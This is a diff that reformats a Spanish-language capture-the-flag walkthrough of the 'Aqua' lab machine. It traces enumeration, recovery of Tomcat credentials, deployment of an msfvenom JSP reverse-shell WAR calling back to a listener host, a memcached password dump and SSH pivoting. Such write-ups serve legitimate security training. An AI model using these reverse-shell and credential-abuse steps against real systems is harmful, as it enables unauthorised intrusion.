@@ -1,11 +1,11 @@
 # Maquina Aqua
 
-Sistema Operativo: Linux
-Dificultad: Media
+## Sistema Operativo: Linux
+## Dificultad: Media
 
-# Enumeracion de Puertos y Servicios
+## Enumeracion de Puertos y Servicios
 
-# PUERTOS
+### PUERTOS
 
 PORT     STATE SERVICE
 22/tcp   open  ssh
@@ -14,9 +14,9 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 -------------------------
-# SERVICIOS
+### SERVICIOS
 
-
+~~~
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -33,10 +33,10 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache Tomcat/8.5.5
 MAC Address: 08:00:27:7E:F4:F5 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
+~~~
 # Con nmap enumeraremos 4 directorios y archivos que contiene 
 
-
+~~~
  nmap --script http-enum -p80,8080 192.168.2.242 -oN webscan
 Starting Nmap 7.70 ( https://nmap.org ) at 2022-03-16 16:14 CET
 Nmap scan report for 192.168.2.242
@@ -55,40 +55,43 @@ PORT     STATE SERVICE
 |   /manager/html: Apache Tomcat (401 )
 |_  /docs/: Potentially interesting folder
 MAC Address: 08:00:27:7E:F4:F5 (Oracle VirtualBox virtual NIC)
+~~~
 
-# Puerto 80
-# Enumeracion Web
+## Puerto 80
+### Enumeracion Web
 
 La pagina web tiene un texto  
 
-# El agua (del latín aqua)
+## El agua (del latín aqua)
 
 El (agua)1 es una sustancia cuya molécula está compuesta por dos átomos de hidrógeno y uno de oxígeno (H2O)2.
 
-# robots.txt
+### robots.txt
 
 /SuperCMS
 
-# Fuzzing
+## Fuzzing
 
-# web puerto 80
+## web puerto 80
 http://192.168.2.242/
-
+~~~
 000039:  C=301      9 L	      28 W	    312 Ch	  "img"
 000550:  C=301      9 L	      28 W	    312 Ch	  "css"
-
+~~~
 
 http://192.168.2.242/SuperCMS
-
+~~~
 000002:  C=200    149 L	      25 W	    799 Ch	  "index - html"
 000116:  C=200     47 L	      90 W	   2146 Ch	  "login - html"
+~~~
 
 en el codigofuente de /SuperCMS/index.html
 
 tenemos una cadena de texto que esta cifrado en base64 "MT0yID0gcGFzc3dvcmRfemlwCg=="
-
+~~~
 echo "MT0yID0gcGFzc3dvcmRfemlwCg=="|base64 -d
 1=2 = password_zip
+~~~
 
 conseguimos una pista 1=2 > password_zip, estos numeros los tenemos en el texto que copiamos antes 1 para agua 2 para H2O
 
@@ -96,23 +99,24 @@ tenemos una pagina llamada login.html le echamos un vistazo contiene un panel de
 
 pero si miramos el codigo tiene un par de lienas comentadas
 
-# ------------------------------------------
+~~~
 <!--<button class="btn" href="www.twitter.com/AquilinoMS">Contact</button>-->
 <!--https://web.archive.org/web/*/www.twitter.com/**********-->
 <!--<p class ="Source"SuperCMS<span><a href="github.com/aquilino/SuperCMS"> look source code</a></span></p>-->
+~~~
 
 hay un repo de github  de SuperCMS, nos descargamos el repositorio y accedemos a la carpeta
 
-❯ git clone https://github.com/aquilino/SuperCMS.git
+'❯ git clone https://github.com/aquilino/SuperCMS.git
 cd SuperCMS
 le hacemos un  git log y miramos los commits
-buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt
-bash'''
+buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt' 
+
 ❯ git log -c 58afe63a1cd28fa167b95bcff50d2f6f011337c1
 commit 58afe63a1cd28fa167b95bcff50d2f6f011337c1
 Author: aquilino <hidro23@hotmail.com>
 Date:   Thu Jun 17 12:59:05 2021 +0200
-'''
+
     Create knocking_on_Atlantis_door.txt
     
     Las Puertas del avismo
@@ -205,17 +209,17 @@ passwword_zip = agua=H2O
 
 una vez descomprimido encotramos un archivo critico de tomcat donde se guardan las credenciales de usuario
 
-<user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>
+'<user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>'
 
-# Credenciales 
+## *Credenciales* 
 
 aquaMan:P4st3lM4n --> tomcat
---------------------------
 
 con estas credenciales accedemos al servicio tomcat
 
 
 como veremos podemos hacer un deploy de un archivo war que con msfvenom crearemos.
+
 ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.55 LPORT=443 -f war -o shell.war
 Payload size: 1091 bytes
 Final size of war file: 1091 bytes
@@ -246,7 +250,8 @@ export TERM=xterm
 export SHELL=bash
 stty rows 57 columns 212
 
-#Pivoting User
+## Pivoting User
+
 si le hacemos un ps aux verermos que usa memcached
 
 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
@@ -275,7 +280,7 @@ get password
 VALUE password 0 18
 N3ptun0D10sd3lM4r$
 END
----------------------------
+
 si miramos el /etc/passwd veremos quiene es el user Poseidon perez
 
 accedemos por ssh como el usuario tridente y conseguimos la primera flag
@@ -323,5 +328,3 @@ Session completed.
 
 
 con gpg -d root.txt.gpg  podremos ver la flag de root
-
-Hasta aqui la maquina Aqua.
